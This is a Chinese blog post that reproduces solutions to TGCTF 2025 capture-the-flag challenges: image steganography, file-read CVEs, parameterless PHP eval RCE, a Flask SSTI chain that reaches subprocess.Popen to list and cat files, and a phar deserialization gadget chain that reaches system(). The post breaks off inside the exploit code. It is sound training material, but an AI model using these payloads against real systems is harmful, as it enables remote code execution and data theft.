        <content type="html"><![CDATA[<blockquote><p>跟w8nn9z和1n1t组队打的，这次其他方向也是硬扛出了一点......</p><p>很好的新生赛，使我开始学web()</p></blockquote><h2 id="writeup部分">Writeup部分</h2><h4 id="writeup点我"><ahref="https://www.blog.st4rr.top/writeups/TGCTF2025Writeup.pdf">Writeup点我</a></h4><h2 id="复现部分">复现部分</h2><h3 id="misc">Misc</h3><h4 id="你能发现图片里的秘密吗">你能发现图片里的秘密吗</h4><p>对给的图片zsteg就能找到7z的密码</p><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415151311939.png"alt="image-20250415151311939" /><figcaption aria-hidden="true">image-20250415151311939</figcaption></figure><p>先看一下png，发现结尾的IDAT块在上一个没填满的情况下就开始了，单独把这个IDAT块拿出来保存成png</p><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415154312488.png"alt="image-20250415154312488" /><figcaption aria-hidden="true">image-20250415154312488</figcaption></figure><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415154438788.png"alt="image-20250415154438788" /><figcaption aria-hidden="true">image-20250415154438788</figcaption></figure><p>看起来宽高有点问题，用puzzlesolver爆破一下正确的宽高修复一下，得到flag1</p><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415155341328.png"alt="image-20250415155341328" /><figcaption aria-hidden="true">image-20250415155341328</figcaption></figure><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415155420288.png"alt="image-20250415155420288" /><figcaption aria-hidden="true">image-20250415155420288</figcaption></figure><p>根据官方wp，pdf放进ps里面可以看到第二个图层，把上面那张图移开就能看到flag。但是复现网站给的附件好像有点问题，没有第二个图层。</p><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415161327830.png"alt="image-20250415161327830" /><figcaption aria-hidden="true">image-20250415161327830</figcaption></figure><h3 id="web">Web</h3><h4 id="前端game-plus">前端Game-Plus</h4><p>还是跟之前一样找到flag的路径，用<ahref="https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect">CVE-2025-31486</a>进行任意文件读取</p><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415182429761.png"alt="image-20250415182429761" /><figcaption aria-hidden="true">image-20250415182429761</figcaption></figure><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415182817375.png"alt="image-20250415182817375" /><figcaption aria-hidden="true">image-20250415182817375</figcaption></figure><h4 id="前端game-ultra">前端Game Ultra</h4><p>还是跟之前一样找到flag的路径，用<ahref="https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA">CVE-2025-32395</a>进行任意文件读取</p><p>这题给出了附件，从dockerfile可以看出workdir是/app，多试几次目录穿越到根目录读flag就行</p><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415183956367.png"alt="image-20250415183956367" /><figcaption aria-hidden="true">image-20250415183956367</figcaption></figure><h4 id="aaa偷渡阴平复仇">AAA偷渡阴平（复仇）</h4><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;</span><br><span class="line">    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实际上仍然是无参rce，用session_start启用sessionid，然后把恶意代码写在sessionid里就行</p><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415192352015.png"alt="image-20250415192352015" /><figcaption aria-hidden="true">image-20250415192352015</figcaption></figure><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415192422174.png"alt="image-20250415192422174" /><figcaption aria-hidden="true">image-20250415192422174</figcaption></figure><h4 id="直面天命复仇">直面天命（复仇）</h4><p>前面都跟直面天命那题一样，只不过这里aazz路由是直接给出的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory</span><br><span class="line"><span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span></span><br><span class="line">    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace</span><br><span class="line">    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    template1=<span class="string">&quot;&quot;</span></span><br><span class="line">    template2=<span class="string">&quot;&quot;</span></span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> waf(name):</span><br><span class="line">        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">if</span> is_typable(i):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            k=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):</span><br><span class="line">                template = <span class="string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">再去西行历练历练</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">            template1 = <span class="string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”</span></span><br><span class="line"><span class="string">最后，如果你用了cat，就可以见到齐天大圣了</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">            template= template.replace(<span class="string">&quot;天命&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;难违&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">            template = template</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:</span><br><span class="line">        template2 = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">或许你这只叫天命人的猴子，真的能做到？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="string">f&quot;500报错了，查询语句如下：</span></span><br><span class="line"><span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> error_message, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hinter</span>():</span><br><span class="line">    template=<span class="string">&quot;hint：</span></span><br><span class="line"><span class="string">有一个aazz路由，去那里看看吧，天命人!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">finder</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        source_code = f.read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;</span></span><br><span class="line"><span class="string"><span class="subst">&#123;source_code&#125;</span></span></span><br><span class="line"><span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>在上面一题中我们可以读/a/b/c/d/secret.py得到secretkey是直面天命</p><p>再看代码，天命被替换成了，所以在天命和难违之间写我们的payload就行。</p><p>先看一下有哪些类可以用</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()</span><br></pre></td></tr></table></figure><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415202837946.png"alt="image-20250415202837946" /><figcaption aria-hidden="true">image-20250415202837946</figcaption></figure><p>这里我们用subprocess.Popen这个类，其下标为351，先看一下flag叫什么</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[351]([&#x27;ls&#x27;,&#x27;/&#x27;],stdout=-1).communicate()[0]</span><br></pre></td></tr></table></figure><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415203751321.png"alt="image-20250415203751321" /><figcaption aria-hidden="true">image-20250415203751321</figcaption></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[351]([&#x27;cat&#x27;,&#x27;/tgffff11111aaaagggggggg&#x27;],stdout=-1).communicate()[0]</span><br></pre></td></tr></table></figure><figure><img src="/images/TGCTF2025-Writeup-复现/image-20250415204932832.png"alt="image-20250415204932832" /><figcaption aria-hidden="true">image-20250415204932832</figcaption></figure><h4 id="什么文件上传复仇">什么文件上传（复仇）</h4><p>前面的部分跟原来那题还是一样，读robots.txt，爆破出可以上传的文件后缀名是atg，读class.php</p><p>class.php源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">best64_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>))));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$study</span>=<span class="string">&quot;study&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;learn = <span class="string">&quot;learn&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;study-&gt;<span class="title function_ invoke__">hard</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;did = <span class="string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;done = <span class="string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;done;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;doing))==<span class="number">666</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doing</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;doing-&gt;better;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;good=<span class="string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;good;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bad=<span class="string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$out</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$no</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span class="variable">$useful20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;out-&gt;useful7) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is your future.&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&quot;wow&quot;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;win&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;no = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;no;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="number">0</span>,-<span class="number">4</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">best64</span>(<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// You learn yesterday, you choose today, can you get to your future?</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里是用phar做到反序列化，可以看到这里用了存在漏洞的file_exists函数。</p><p>构造链子的方式大体与上题一致。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$study</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;study = <span class="keyword">new</span> <span class="title function_ invoke__">today</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;doing = <span class="keyword">new</span> <span class="title function_ invoke__">future</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">future</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;win&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ 